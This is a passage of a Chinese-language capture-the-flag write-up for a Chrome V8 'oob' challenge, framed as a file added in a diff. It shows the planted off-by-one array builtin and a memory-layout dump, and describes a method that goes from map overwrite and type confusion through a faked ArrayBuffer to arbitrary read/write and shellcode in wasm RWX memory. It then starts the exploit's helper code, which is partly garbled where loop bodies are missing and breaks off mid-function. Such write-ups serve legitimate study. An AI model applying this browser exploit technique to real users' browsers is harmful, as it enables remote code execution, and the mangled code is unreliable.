@@ -1,0 +1,201 @@
+# *ctf chrome oob writeup
+## bug
+    +BUILTIN(ArrayOob){
+    +    uint32_t len = args.length();
+    +    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();//check len receiver;
+    +    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+    +            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    +    Handle array = Handle::cast(receiver);
+    +    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+    +    uint32_t length = static_cast(array->length()->Number());
+    +    if(len == 1){
+    +        //read
+    +        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));---->length off by one
+    +    }else{
+    +        //write
+    +        Handle value;
+    +        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+    +                isolate, value, Object::ToNumber(isolate, args.at(1)));
+    +        elements.set(length,value->Number());---->length off by one
+    +        return ReadOnlyRoots(isolate).undefined_value();
+    +    }
+    +}
+可以看到在length这里有一个off-by-one
+另外，这里有一个非预期的UAF，其实在Object::ToNumber(isolate,
+args.at(1)))可以触发回调，通过valueof或者Symbol.toPrimitive可以在这里将array的length改成0之后强制GC将其回收掉，然后重新喷内存占位，由于我们之前缓存了length，可以一开始用一个非常大的length，而此时占位的array是我们可控的，可以占位一个length比较小的array，于是就可以任意OOB，而不是off
+by one。  
+类似的做法参考CVE-2017-5053，应该也是可以这么利用的，我没做太多尝试，有兴趣的同学可以试一下，不过显然这种做法会非常不稳定。
+## 基础知识
+v8通过map来判断类型，通过off-by-one来修改map即可产生type confusion
+## trick
+### splice
+通过splice控制array的内存排布紧邻。
+    var ab = new ArrayBuffer(0x1000);
+    var a = [1.1, 1.1, 1.1, 1.1];
+    var b = [{}, {}, ab, 2.2, 2.2];
+    var c = [3.3, 3.3, 3.3, 3.3, 3.3];
+    //布局内存，让array连续存放
+    a = a.splice(0);
+    b = b.splice(0);
+    c = c.splice(0);
+test如下：  
+可以看到如图所示的内存布局：  
+a elements的length位置存放的就是a obj的map了，于是a.oob(xxx)就可以将a的map给覆盖掉。
+    //0x33a1055ce0e1->0x33a1055ce0b1
+    //0x33a1055ce139->0x33a1055ce101
+    //0x33a1055ce191->0x33a1055ce159
+    // x/60gx 0x33a1055ce0b1-1
+    // 0x33a1055ce0b0: {0x000033a10f4814f9 0x0000000400000000->a elements
+    // 0x33a1055ce0c0: 0x3ff199999999999a 0x3ff199999999999a
+    // 0x33a1055ce0d0: 0x3ff199999999999a 0x3ff199999999999a}
+    // 0x33a1055ce0e0: {0x000033a14e0c2ed9 0x000033a10f480c71->a obj
+    // 0x33a1055ce0f0: 0x000033a1055ce0b1 0x0000000400000000}
+    // 0x33a1055ce100: {0x000033a10f480801 0x0000000500000000->b elements
+    // 0x33a1055ce110: 0x000033a1055cdfc9 0x000033a1055ce001
+    // 0x33a1055ce120: 0x000033a1055cdf01 0x000033a12d09f3f9
+    // 0x33a1055ce130: 0x000033a12d09f409}
+    //                                    {0x000033a14e0c2f79->b obj
+    // 0x33a1055ce140: 0x000033a10f480c71 0x000033a1055ce101
+    // 0x33a1055ce150: 0x0000000500000000}
+    //                                    {0x000033a10f4814f9->c elements
+    // 0x33a1055ce160: 0x0000000500000000 0x400a666666666666
+    // 0x33a1055ce170: 0x400a666666666666 0x400a666666666666
+    // 0x33a1055ce180: 0x400a666666666666 0x400a666666666666}
+    // 0x33a1055ce190: {0x000033a14e0c2ed9 0x000033a10f480c71->c obj
+    // 0x33a1055ce1a0: 0x000033a1055ce159 0x0000000500000000}
+    // 0x33a1055ce1b0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef
+    // 0x33a1055ce1c0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef
+    // 0x33a1055ce1d0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef
+### gc
+在要fake的arraybuffer的前后两次gc，使其内存分布更稳定。
+### debug
+调试的话，直接在对应版本的v8 release上调试，然后写到html里，放到chrome里就行了，偏移什么的都没有改变。  
+也可以直接gdb attach到chrome里调试。
+## exp
+利用思路非常简单  
+首先分配两个array，一个double array，一个object array  
+然后通过覆盖object array的map为double map，就可以将其中的用户空间对象leak出来。  
+然后在array的elments去fake一个arraybuffer。  
+然后通过将double array的map覆盖成object array，就可以将fake好的arraybuffer给当成object给取出来。  
+而这个fake的arraybuffer的内容是我们可控的，于是就可以任意地址读写了。  
+接下来就是找到wasm_func里rwx的地址，将shellcode写入执行即可。  
+我的exp写的比较dirty。
+    String.prototype.padLeft =
+    Number.prototype.padLeft = function(total, pad) {
+      return (Array(total).join(pad || 0) + this).slice(-total);
+    }
+    // Return the hexadecimal representation of the given byte array.
+    function hexlify(bytes) {
+        var res = [];
+        for (var i = 0; i  8)
+                parts.splice(8, 0, ' ');
+            lines.push(parts.join(' '));
+        }
+        return lines.join('\n');
+    }
+    // Simplified version of the similarly named python module.
+    var Struct = (function() {
+        // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
+        var buffer      = new ArrayBuffer(8);
+        var byteView    = new Uint8Array(buffer);
+        var uint32View  = new Uint32Array(buffer);
+        var float64View = new Float64Array(buffer);
+        return {
+            pack: function(type, value) {
+                var view = type;        // See below
+                view[0] = value;
+                return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
+            },
+            unpack: function(type, bytes) {
+                if (bytes.length !== type.BYTES_PER_ELEMENT)
+                    throw Error("Invalid bytearray");
+                var view = type;        // See below
+                byteView.set(bytes);
+                return view[0];
+            },
+            // Available types.
+            int8:    byteView,
+            int32:   uint32View,
+            float64: float64View
+        };
+    })();
+    function Int64(v) {
+        // The underlying byte array.
+        var bytes = new Uint8Array(8);
+        switch (typeof v) {
+            case 'number':
+                v = '0x' + Math.floor(v).toString(16);
+            case 'string':
+                if (v.startsWith('0x'))
+                    v = v.substr(2);
+                if (v.length % 2 == 1)
+                    v = '0' + v;
+                var bigEndian = unhexlify(v, 8);
+                //print(bigEndian.toString());
+                bytes.set(Array.from(bigEndian).reverse());
+                break;
+            case 'object':
+                if (v instanceof Int64) {
+                    bytes.set(v.bytes());
+                } else {
+                    if (v.length != 8)
+                        throw TypeError("Array must have excactly 8 elements.");
+                    bytes.set(v);
+                }
+                break;
+            case 'undefined':
+                break;
+            default:
+                throw TypeError("Int64 constructor requires an argument.");
+        }
+        // Return a double whith the same underlying bit representation.
+        this.asDouble = function() {
+            // Check for NaN
+            if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
+                throw new RangeError("Integer can not be represented by a double");
+            return Struct.unpack(Struct.float64, bytes);
+        };
+        // Return a javascript value with the same underlying bit representation.
+        // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
+        // due to double conversion constraints.
+        this.asJSValue = function() {
+            if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
+                throw new RangeError("Integer can not be represented by a JSValue");
+            // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
+            this.assignSub(this, 0x1000000000000);
+            var res = Struct.unpack(Struct.float64, bytes);
+            this.assignAdd(this, 0x1000000000000);
+            return res;
+        };
+        // Return the underlying bytes of this number as array.
+        this.bytes = function() {
+            return Array.from(bytes);
+        };
+        // Return the byte at the given index.
+        this.byteAt = function(i) {
+            return bytes[i];
+        };
+        // Return the value of this number as unsigned hex string.
+        this.toString = function() {
+            //print("toString");
+            return '0x' + hexlify(Array.from(bytes).reverse());
+        };
+        // Basic arithmetic.
+        // These functions assign the result of the computation to their 'this' object.
+        // Decorator for Int64 instance operations. Takes care
+        // of converting arguments to Int64 instances if required.
+        function operation(f, nargs) {
+            return function() {
+                if (arguments.length != nargs)
+                    throw Error("Not enough arguments for function " + f.name);
+                for (var i = 0; i  0xff | 0;
+                bytes[i] = cur;
+            }
+            return this;
+        }, 2);
+        // this = a - b
+        this.assignSub = operation(function sub(a, b) {
+            var carry = 0;
+            for (var i = 0; i < 8; i++) {
+                var cur = a.byteAt(i) - b.byteAt(i) - carry;
+                carry = cur < 0 | 0;
